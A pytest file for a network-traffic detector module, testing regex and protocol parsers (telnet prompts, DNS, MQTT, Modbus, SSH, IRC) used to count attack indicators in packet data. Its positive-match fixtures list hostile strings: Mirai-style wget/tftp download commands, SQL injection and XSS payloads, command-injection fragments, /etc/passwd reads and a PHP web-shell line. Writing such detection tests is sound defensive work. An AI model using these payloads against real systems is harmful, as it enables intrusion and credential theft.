"""Detectors D1–D13, parsers, direction rules, eligibility and b_i (content/detectors.py)."""
import random
import struct

import dpkt
import polars as pl
import pytest

from ctsample.content import detectors as D


def pk(fn, payload: bytes, tcp: bool = True) -> int:
    return fn(payload, payload.lower(), tcp)


def dns_msg(qr: int, rcode: int = 0, name: str = "example.com", nq: int = 1) -> bytes:
    d = dpkt.dns.DNS(id=7, qr=qr, rcode=rcode)
    d.qd = [dpkt.dns.DNS.Q(name=name, type=dpkt.dns.DNS_A, cls=dpkt.dns.DNS_IN) for _ in range(nq)]
    return bytes(d)


def mqtt_connect() -> bytes:
    vh = b"\x00\x04MQTT\x04\x02\x00\x3c" + b"\x00\x03abc"
    return bytes([0x10, len(vh)]) + vh


def mqtt_publish(topic=b"t/1", msg=b"23.5", qos=0) -> bytes:
    body = struct.pack("!H", len(topic)) + topic + (b"\x00\x01" if qos else b"") + msg
    return bytes([0x30 | (qos << 1), len(body)]) + body


def mbap(fc: int, tid: int = 1) -> bytes:
    pdu = bytes([fc]) + b"\x00\x01\x00\x0a"
    return struct.pack("!HHHB", tid, 0, 1 + len(pdu), 1) + pdu


POS = {
    "D1": [b"\r\nPassword: ", b"password:", b"PASSWORD   :"],
    "D2": [b"login: ", b"Username:", b"\r\nLOGIN :"],
    "D3": [b"/bin/busybox ECCHI", b"busybox MIRAI", b"cd /tmp; wget http://1.2.3.4/x", b"tftp -g -r a 1.2.3.4",
           b"chmod +x f", b"chmod 777 f", b"GET /bins/mirai.arm7 HTTP/1.0", b"x.mpsl\r\n", b"OKIRU", b"hakai",
           b"busybox wget"],
    "D4": [b"id=1 UNION SELECT a", b"x' or 1=1 --", b"SLEEP(5)", b"benchmark(10,md5(1))", b"<script>alert(1)",
           b"javascript:alert(1)", b"<img onerror=x>", b"<body onload=x>", b"; cat /etc/x", b"| ls -la",
           b"&& wget x", b"GET /../../etc/passwd"],
    "D5": [b"GET /index.html HTTP/1.1\r\n", b"POST /login.php HTTP/1.0\r\n", b"options * HTTP/1.1\r\n"],
    "D11": [b"SSH-2.0-OpenSSH_7.4\r\n", b"SSH-1.5-x\r\n"],
    "D12": [b"NICK [ARM4T|PCVREB]\nUSER x\n", b"PING :irc.x\r\n", b"JOIN #c\r\n", b"PRIVMSG #c :hi\r\n"],
    "D13": [b"<?php system($_GET[c]); ?>", b"passthru('x')", b"shell_exec(", b"/bin/sh -c x", b"/bin/bash",
            b"whoami", b"uname -a", b"cat /etc/passwd"],
}
NEG = {
    "D1": [b"pass word", b"passwd:", b"Password"],
    "D2": [b"log in:", b"user:", b"loginname"],
    "D3": [b"busybox", b"wget ftp://x", b"chmod 644 f", b"file.army", b"arm7", b"tftp -p"],
    "D4": [b"union all", b"or 1=2", b"sleep 5", b"<scrip>", b"; echo", b"..\\", b"catalog"],
    "D5": [b" GET / HTTP/1.1", b"GET / HTTP/2.0", b"FETCH / HTTP/1.1", b"GET  HTTP/1.1"],
    "D11": [b"xSSH-2.0-x", b"SSH-3.0-x", b"ssh2"],
    "D12": [b"xNICK a", b"PINGx", b"MODE #c +o", b"PRIVMSG"],
    "D13": [b"<?xml", b"system ()", b"/bin/shell", b"who am i", b"uname -r", b"/etc/shadow"],
}


@pytest.mark.parametrize("rid", sorted(POS))
def test_regex_detectors(rid):
    fn = D.RAW_BY_ID[rid].fn
    for p in POS[rid]:
        assert pk(fn, p) >= 1, (rid, p)
    for p in NEG[rid]:
        assert pk(fn, p) == 0, (rid, p)


def test_counts_are_capped_per_packet():
    assert pk(D.d1, b"password: " * 3) == 3
    assert pk(D.d1, b"password: " * 9) == D.PKT_CAP
    assert pk(D.d5, b"GET /a HTTP/1.1\r\n\r\nGET /b HTTP/1.1\r\n\r\n") == 2
    assert pk(D.d9, mqtt_publish() * 7) == D.PKT_CAP
    assert pk(D.d6, dns_msg(0, nq=2), tcp=False) == 2


def test_dns_parsers():
    assert pk(D.d6, dns_msg(0), tcp=False) == 1 and pk(D.d6, dns_msg(1), tcp=False) == 0
    assert pk(D.d7, dns_msg(1, rcode=3), tcp=False) == 1 and pk(D.d7, dns_msg(1, rcode=0), tcp=False) == 0
    m = dns_msg(0)
    assert pk(D.d6, struct.pack("!H", len(m)) + m + struct.pack("!H", len(m)) + m, tcp=True) == 2
    assert pk(D.d6, b"\x00" * 5, tcp=False) == 0 and pk(D.d7, b"garbage" * 3, tcp=False) == 0


def test_mqtt_parser():
    assert D.mqtt_types(mqtt_connect() + mqtt_publish() + mqtt_publish(qos=1)) == [1, 3, 3]
    assert pk(D.d8, mqtt_connect()) == 1 and pk(D.d8, mqtt_publish()) == 0
    assert pk(D.d9, mqtt_publish()) == 1 and pk(D.d9, mqtt_connect()) == 0
    assert D.mqtt_types(b"\x10\x05\x00\x04XXXX") == []                 # wrong protocol name
    assert D.mqtt_types(b"\x36\x02ab") == []                             # PUBLISH with QoS 3 is invalid
    assert D.mqtt_types(b"\x00\x01") == [] and D.mqtt_types(b"") == []
    assert D.mqtt_types(b"\x30\x80") == []                               # truncated remaining length


def test_modbus_parser():
    for fc in (5, 6, 15, 16):
        assert pk(D.d10, mbap(fc)) == 1
    for fc in (1, 2, 3, 4, 0x85):
        assert pk(D.d10, mbap(fc)) == 0
    assert pk(D.d10, mbap(3) + mbap(16, 2)) == 1                         # second ADU in the segment
    bad = bytearray(mbap(6))
    bad[2] = 1                                                            # protocol id != 0
    assert pk(D.d10, bytes(bad)) == 0


def test_flow_detectors_eligibility_and_directions():
    ids = lambda proto, a, b: [x[0] for x in D.flow_detectors(proto, a, b)]   # noqa: E731
    assert ids(6, 40000, 23)[:2] == ["D1", "D2"] and "D6" not in ids(6, 40000, 23)
    assert "D3" in ids(17, 5, 6) and "D4" not in ids(17, 5, 6) and ids(1, 8, 0) == []
    assert set(ids(17, 3333, 53)) == {"D3", "D6", "D7"}
    assert "D8" in ids(6, 50000, 1883) and "D10" in ids(6, 502, 40000) and "D11" in ids(6, 50000, 22)
    d = {x[0]: x[2] for x in D.flow_detectors(6, 40000, 23)}
    assert d["D1"] == 1 and d["D3"] is None and d["D5"] == 0             # server = responder: s2c = dir 1
    d = {x[0]: x[2] for x in D.flow_detectors(6, 23, 40000)}
    assert d["D1"] == 0                                                   # server is the initiator side
    d = {x[0]: x[2] for x in D.flow_detectors(6, 50000, 22)}
    assert d["D11"] == 0
    hits = D.run_packet(D.flow_detectors(6, 40000, 23), b"login: ", 1, True)
    assert hits == [("D2", 1)]
    assert D.run_packet(D.flow_detectors(6, 40000, 23), b"login: ", 0, True) == []   # wrong direction


def test_estimand_hits_and_opening():
    raw = {"D1": [2, 2, 3], "D3": [1, 1, 0], "D11": [1, 1, 0], "D5": [5, 3, 1]}
    rows = {r[0]: r for r in D.estimand_hits(raw, fps=True)}
    assert rows["D1o"][1] == 1 and rows["D1c"][1] == 2 and rows["D3"][1] == 1 and rows["D5"][1] == 5
    assert rows["D11o"][1] == 1 and rows["D1"][1] == 1 and rows["D11"][1] == 1
    rows = {r[0] for r in D.estimand_hits(raw, fps=False)}
    assert "D1o" not in rows and "D11o" not in rows and "D1c" in rows


def test_eligibility_b_and_vectorised_agree():
    e = D.eligibility(6, 40000, 23, True, True, 10, 7)
    assert e["D1o"] == (True, 1) and e["D1c"] == (True, 28) and e["D5"] == (True, 40) and e["D3"] == (True, 1)
    assert e["D6"] == (False, 0) and e["D9"] == (False, 0)
    e = D.eligibility(6, 40000, 23, True, False, 10, 7)
    assert e["D1o"] == (False, 0) and e["D1c"] == (True, 28)
    assert D.eligibility(17, 4444, 53, True, True, 3, 3)["D6"] == (True, 12)
    assert D.eligibility(6, 1883, 50000, True, True, 2, 9)["D9"] == (True, 44)
    assert all(not v[0] for v in D.eligibility(6, 40000, 23, False, False, 3, 3).values())
    rng = random.Random(3)
    ports = [22, 23, 53, 80, 502, 1883, 2222, 2323, 8883, 40000, 5353]
    rows = [dict(proto=rng.choice([6, 17, 1]), port_a=rng.choice(ports), port_b=rng.choice(ports),
                 pay=rng.random() < 0.7, fps=rng.random() < 0.4, pkts0=rng.randint(0, 9), pkts1=rng.randint(0, 9))
            for _ in range(400)]
    df = pl.DataFrame(rows)
    ex = D.eligibility_exprs()
    out = df.with_columns([v[0].alias(f"e_{k}") for k, v in ex.items()] + [v[1].alias(f"b_{k}") for k, v in ex.items()])
    for i, r in enumerate(rows):
        sc = D.eligibility(r["proto"], r["port_a"], r["port_b"], r["pay"], r["fps"], r["pkts0"], r["pkts1"])
        for k, (el, b) in sc.items():
            assert out[f"e_{k}"][i] == el and out[f"b_{k}"][i] == b, (k, r)


def test_estimands_yaml_matches_code():
    from pathlib import Path

    import yaml
    from ctsample.content.suricata import FAMILIES
    cfg = yaml.safe_load((Path(__file__).resolve().parents[1] / "config" / "estimands.yaml").read_text())
    ids = [e["id"] for e in cfg["estimands"]]
    assert len(ids) == len(set(ids))
    for e in cfg["estimands"]:
        assert {"id", "class", "eligibility", "opening", "b", "datasets"} <= set(e), e["id"]
    det = {e["id"]: e for e in cfg["estimands"] if e["source"] == "detector"}
    assert set(det) == set(D.DET_ESTIMAND_IDS)
    for e in D.DET_ESTIMANDS:
        assert det[e.id]["class"] == e.cls and det[e.id]["detector"] == e.raw
        assert det[e.id]["opening"] == (e.cls == "indicator_opening")
    assert {e["id"] for e in cfg["estimands"] if e["source"] == "suricata"} == set(FAMILIES)
    assert {"L1", "L2", "L3", "L4", "L5"} <= set(ids)
